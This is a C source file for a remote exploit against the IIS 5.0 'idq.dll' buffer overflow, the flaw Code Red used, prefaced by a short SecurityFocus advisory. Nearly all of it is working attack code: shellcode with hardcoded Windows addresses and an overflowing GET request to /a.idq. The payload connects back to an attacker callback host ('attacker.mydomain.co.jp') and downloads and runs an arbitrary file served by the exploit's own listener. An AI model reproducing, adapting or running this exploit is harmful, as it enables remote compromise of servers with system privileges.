/*
source: http://www.securityfocus.com/bid/2880/info
 
Windows Index Server ships with Windows NT 4.0 Option Pack; Windows Indexing Service ships with Windows 2000. An unchecked buffer resides in the 'idq.dll' ISAPI extension associated with each service. A maliciously crafted request could allow arbitrary code to run on the host in the Local System context.
 
Note that Index Server and Indexing Service do not need to be running for an attacker to exploit this issue. Since 'idq.dll' is installed by default when IIS is installed, IIS would need to be the only service running.
 
Note also that this vulnerability is currently being exploited by the 'Code Red' worm. In addition, all products that run affected versions of IIS are also vulnerable.
*/

/*
 IIS5.0 .idq overrun remote exploit
 Programmed by hsj  : 01.06.21

 code flow:
  overrun -> jmp or call ebx -> jmp 8 ->
  check shellcode addr and jump to there ->
  shellcode -> make back channel -> download & exec code
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <limits.h>
#include <netdb.h>
#include <arpa/inet.h>

#define RET                 0x77e516de  /* jmp or call ebx */
#define GMHANDLEA           0x77e56c42  /* Address of GetModuleHandleA */
#define GPADDRESS           0x77e59ac1  /* Address of GetProcAddress */
#define GMHANDLEA_OFFSET    24
#define GPADDRESS_OFFSET    61
#define OFFSET              234         /* exception handler offset */
#define NOP                 0x41

#define MASKING             1
#if MASKING
#define PORTMASK            0x4141
#define ADDRMASK            0x41414141
#define PORTMASK_OFFSET     128
#define ADDRMASK_OFFSET     133
#endif

#define PORT                80
#define ADDR                "attacker.mydomain.co.jp"
#define PORT_OFFSET         115
#define ADDR_OFFSET         120
unsigned char shellcode[]=
"\x5B\x33\xC0\x40\x40\xC1\xE0\x09\x2B\xE0\x33\xC9\x41\x41\x33\xC0"
"\x51\x53\x83\xC3\x06\x88\x03\xB8\xDD\xCC\xBB\xAA\xFF\xD0\x59\x50"
"\x43\xE2\xEB\x33\xED\x8B\xF3\x5F\x33\xC0\x80\x3B\x2E\x75\x1E\x88"
"\x03\x83\xFD\x04\x75\x04\x8B\x7C\x24\x10\x56\x57\xB8\xDD\xCC\xBB"
"\xAA\xFF\xD0\x50\x8D\x73\x01\x45\x83\xFD\x08\x74\x03\x43\xEB\xD8"
"\x8D\x74\x24\x20\x33\xC0\x50\x40\x50\x40\x50\x8B\x46\xFC\xFF\xD0"
"\x8B\xF8\x33\xC0\x40\x40\x66\x89\x06\xC1\xE0\x03\x50\x56\x57\x66"
"\xC7\x46\x02\xBB\xAA\xC7\x46\x04\x44\x33\x22\x11"
#if MASKING
"\x66\x81\x76\x02\x41\x41\x81\x76\x04\x41\x41\x41\x41"
#endif
"\x8B\x46\xF8\xFF\xD0\x33\xC0"
"\xC7\x06\x5C\x61\x61\x2E\xC7\x46\x04\x65\x78\x65\x41\x88\x46\x07"
"\x66\xB8\x80\x01\x50\x66\xB8\x01\x81\x50\x56\x8B\x46\xEC\xFF\xD0"
"\x8B\xD8\x33\xC0\x50\x40\xC1\xE0\x09\x50\x8D\x4E\x08\x51\x57\x8B"
"\x46\xF4\xFF\xD0\x85\xC0\x7E\x0E\x50\x8D\x4E\x08\x51\x53\x8B\x46"
"\xE8\xFF\xD0\x90\xEB\xDC\x53\x8B\x46\xE4\xFF\xD0\x57\x8B\x46\xF0"
"\xFF\xD0\x33\xC0\x50\x56\x56\x8B\x46\xE0\xFF\xD0\x33\xC0\xFF\xD0";

unsigned char storage[]=
"\xEB\x02"
"\xEB\x4E"
"\xE8\xF9\xFF\xFF\xFF"
"msvcrt.ws2_32.socket.connect.recv.closesocket."
"_open._write._close._execl.";

unsigned char forwardjump[]=
"%u08eb";

unsigned char jump_to_shell[]=
"%uC033%uB866%u031F%u0340%u8BD8%u8B03"
"%u6840%uDB33%u30B3%uC303%uE0FF";

unsigned int resolve(char *name)
{
    struct hostent *he;
    unsigned int ip;

    if((ip=inet_addr(name))==(-1))
    {
        if((he=gethostbyname(name))==0)
            return 0;
        memcpy(&ip,he->h_addr,4);
    }
    return ip;
}

int make_connection(char *address,int port)
{
    struct sockaddr_in server,target;
    int s,i,bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;
    memset((char *)&server,0,sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = 0;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = resolve(address);
    if(target.sin_addr.s_addr==0)
    {
        close(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctl(s,FIONBIO,&bf);
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        close(s);
        return -3;
    }
    if(i==0)
    {
        close(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        close(s);
        errno = bf;
        return -5;
    }
    ioctl(s,FIONBIO,&bf);
    return s;
}

int get_connection(int port)
{
    struct sockaddr_in local,remote;
    int lsock,csock,len,reuse_addr;

    lsock = socket(AF_INET,SOCK_STREAM,0);
    if(lsock<0)
    {
        perror("socket");
        exit(1);
    }
    reuse_addr = 1;
    if(setsockopt(lsock,SOL_SOCKET,SO_REUSEADDR,(char *)&reuse_addr,sizeof(reus
e_addr))<0)
    {
        perror("setsockopt");
        close(lsock);
        exit(1);
    }
    memset((char *)&local,0,sizeof(local));
    local.sin_family = AF_INET;
    local.sin_port = htons(port);
    local.sin_addr.s_addr = htonl(INADDR_ANY);
    if(bind(lsock,(struct sockaddr *)&local,sizeof(local))<0)
    {
        perror("bind");
        close(lsock);
        exit(1);
    }
    if(listen(lsock,1)<0)
    {
        perror("listen");
        close(lsock);
        exit(1);
    }
retry:
    len = sizeof(remote);
    csock = accept(lsock,(struct sockaddr *)&remote,&len);
    if(csock<0)
    {
        if(errno!=EINTR)
        {
            perror("accept");
            close(lsock);
            exit(1);
        }
        else
            goto retry;
    }
    close(lsock);
    return csock;
}

int main(int argc,char *argv[])
{
    int i,j,s,pid;
    unsigned int cb;
    unsigned short port;
    char *p,buf[512],buf2[512],buf3[2048];
    FILE *fp;

    if(argc!=3)
    {
        printf("usage: $ %s ip file\n",argv[0]);
        return -1;
    }
    if((fp=fopen(argv[2],"rb"))==0)
        return -2;

    if(!(cb=resolve(ADDR)))
        return -3;

    if((pid=fork())<0)
        return -4;

    if(pid)
    {
        fclose(fp);
        s = make_connection(argv[1],80);
        if(s<0)
        {
            printf("connect error:[%d].\n",s);
            kill(pid,SIGTERM);
            return -5;
        }

        j = strlen(shellcode);
        *(unsigned int *)&shellcode[GMHANDLEA_OFFSET] = GMHANDLEA;
        *(unsigned int *)&shellcode[GPADDRESS_OFFSET] = GPADDRESS;
        port = htons(PORT);
#if MASKING
        port ^= PORTMASK;
        cb ^= ADDRMASK;
        *(unsigned short *)&shellcode[PORTMASK_OFFSET] = PORTMASK;
        *(unsigned int *)&shellcode[ADDRMASK_OFFSET] = ADDRMASK;
#endif
        *(unsigned short *)&shellcode[PORT_OFFSET] = port;
        *(unsigned int *)&shellcode[ADDR_OFFSET] = cb;
        for(i=0;i<strlen(shellcode);i++)
        {
            if((shellcode[i]==0x0a)||
               (shellcode[i]==0x0d)||
               (shellcode[i]==0x3a))
                break;
        }
        if(i!=j)
        {
            printf("bad portno or ip address...\n");
            close(s);
            kill(pid,SIGTERM);
            return -6;
        }

        memset(buf,1,sizeof(buf));
        p = &buf[OFFSET-2];
        sprintf(p,"%s",forwardjump);
        p += strlen(forwardjump);
        *p++ = 1;
        *p++ = '%';
        *p++ = 'u';
        sprintf(p,"%04x",(RET>>0)&0xffff);
        p += 4;
        *p++ = '%';
        *p++ = 'u';
        sprintf(p,"%04x",(RET>>16)&0xffff);
        p += 4;
        *p++ = 1;
        sprintf(p,"%s",jump_to_shell);

        memset(buf2,NOP,sizeof(buf2));
        memcpy(&buf2[sizeof(buf2)-strlen(shellcode)-strlen(storage)-1],storage,
strlen(storage));
        memcpy(&buf2[sizeof(buf2)-strlen(shellcode)-1],shellcode,strlen(shellco
de));
        buf2[sizeof(buf2)-1] = 0;

        sprintf(buf3,"GET /a.idq?%s=a HTTP/1.0\r\nShell: %s\r\n\r\n",buf,buf2);
        write(s,buf3,strlen(buf3));

        printf("---");
        for(i=0;i<strlen(buf3);i++)
        {
            if((i%16)==0)
                printf("\n");
            printf("%02X ",buf3[i]&0xff);
        }
        printf("\n---\n");

        wait(0);
        sleep(1);
        shutdown(s,2);
        close(s);

        printf("Done.\n");
    }
    else
    {
        s = get_connection(PORT);
        j = 0;
        while((i=fread(buf,1,sizeof(buf),fp)))
        {
            write(s,buf,i);
            j += i;
            printf(".");
            fflush(stdout);
        }
        fclose(fp);
        printf("\n%d bytes send...\n",j);

        shutdown(s,2);
        close(s);
    }

    return 0;
}


